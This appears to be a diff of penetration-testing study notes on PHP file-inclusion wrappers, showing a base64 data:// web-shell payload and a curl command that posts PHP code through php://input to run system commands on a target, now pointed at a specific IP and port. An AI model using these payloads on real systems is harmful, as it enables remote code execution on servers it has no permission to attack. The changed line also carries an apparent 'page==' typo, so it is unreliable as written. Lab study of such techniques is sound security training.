@@ -29,7 +29,7 @@ data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=
 Similar to the `data` wrapper, the [input](https://www.php.net/manual/en/wrappers.php.php) wrapper can be used to include external input and execute PHP code. The difference between it and the `data` wrapper is that we pass our input to the `input` wrapper as a POST request's data. So, the vulnerable parameter must accept POST requests for this attack to work. Finally, the `input` wrapper also depends on the `allow_url_include` setting, as mentioned earlier
 
 ```bash
-curl -s -X POST --data '<?php system($_REQUEST["cmd"]); ?>' "http://10.10.10.10/index.php?language=php://input&cmd=id" | grep uid
+curl -s -X POST --data '<?php system($_REQUEST["cmd"]); ?>' "http://94.237.56.156:53371/index.php?page==php://input&cmd=id" | grep uid
 ```
 
 ### Expect Wrapper
